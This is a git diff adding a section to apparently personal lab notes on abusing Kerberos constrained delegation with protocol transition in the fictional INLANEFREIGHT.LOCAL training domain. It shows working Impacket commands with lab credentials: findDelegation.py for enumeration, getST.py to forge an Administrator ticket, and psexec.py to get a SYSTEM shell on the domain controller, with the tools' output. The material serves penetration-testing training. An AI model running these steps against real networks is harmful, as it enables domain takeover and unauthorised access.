@@ -1517,3 +1517,125 @@ PS C:\Tools> Enter-PSSession ws01.inlanefreight.local
 inlanefreight\administrator
 ```
 
+### From Linux
+
+Using Impacket's `findDelegation.py`, you can find the accounts with delegation privileges.
+
+```bash
+d41y@htb[/htb]$ findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+                                                                                                                                                                     
+AccountName    AccountType  DelegationType                      DelegationRightsTo                                                                                   
+-------------  -----------  ----------------------------------  --------------------------------                                                                     
+EXCHG01$       Computer     Constrained                         ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL                
+EXCHG01$       Computer     Constrained                         ldap/DC01.INLANEFREIGHT.LOCAL  
+callum.dixon   Person       Unconstrained                       N/A                                                                                                  
+beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01.INLANEFREIGHT.LOCAL                                                                     
+beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01                      
+DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01.INLANEFREIGHT.LOCAL     
+DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01                          
+SQL01$         Computer     Unconstrained                       N/A
+```
+
+You can see there are three types of delegation in the results:
+
+- **Unconstrained**: this accound has unconstrained delegation
+- **Constrained**: this account has constrained delegation without protocol transition support
+- **Constrained w/ Protocol Transition**: this account has constrained delegation with protocol transition support
+
+You will assume that you have already compromised the account `beth.richards`. This account has constrained delegation with protocol transition set, and the only allowed service for delegation is `TERMSRV/DC01.INLANEFREIGHT.LOCAL`.
+
+Using the `getST.py` tool from Impacket, you can craft a valid TGS from an arbitrary user to access the `TERMSRV` service on the `DC01` host.
+
+```bash
+d41y@htb[/htb]$ getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+
+[-] CCache file is not found. Skipping... 
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+
+This will generate a ticket and save it as `Administrator.ccache` in the current directory. Once you have this valid ticket to access the `TERMSRV` service on `DC01` as `Administrator`, you can use it with `psexec.py` from impacket, after exporting its path to the environment variable `KRB5CCNAME`. This tool will update the SPN in this TGS on the fly to get an interactive shell. The `-debug` flag is added on purpose so you can see what's going on.
+
+```bash
+d41y@htb[/htb]$ export KRB5CCNAME=./Administrator.ccache
+d41y@htb[/htb]$ psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+
+[+] Impacket Library Installation Path: /home/plaintext/.local/lib/python3.9/site-packages/impacket
+[+] StringBinding ncacn_np:DC01[\pipe\svcctl]
+[+] Using Kerberos Cache: Administrator.ccache
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+[+] Using TGS from cache
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+[*] Requesting shares on DC01.....
+[*] Found writable share ADMIN$
+[*] Uploading file SmXURDVG.exe
+[*] Opening SVCManager on DC01.....
+[*] Creating service DBou on DC01.....
+[*] Starting service DBou.....
+[+] Using Kerberos Cache: Administrator.ccache
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+[+] Using TGS from cache
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+[+] Using Kerberos Cache: Administrator.ccache
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+[+] Using TGS from cache
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+[!] Press help for extra shell commands
+[+] Using Kerberos Cache: Administrator.ccache
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+[+] Using TGS from cache
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+Reading this output, you can see that multiple times, Impacket is looking for a ticket for a specific SPN, but it can't find it.
+
+```
+[+] SPN CIFS/DC01@INLANEFREIGHT.LOCAL not found in cache
+```
+
+So it keeps looking for other tickets compatible with the target's service account.
+
+```
+[+] Returning cached credential for TERMSRV/DC01@INLANEFREIGHT.LOCAL
+```
+
+Once it finds one, it updates the SPN to the one it's looking for, which here is `CIFS/DC01@INLANEFREIGHT.LOCAL`.
+
+```
+[+] Changing sname from TERMSRV/DC01@INLANEFREIGHT.LOCAL to CIFS/DC01@INLANEFREIGHT.LOCAL and hoping for the best
+```
+
+`psexec.py` repeats this operation to get an interactive shell.
+
+```bash
+d41y@htb[/htb]$ psexec.py -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
+<SNIP>
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
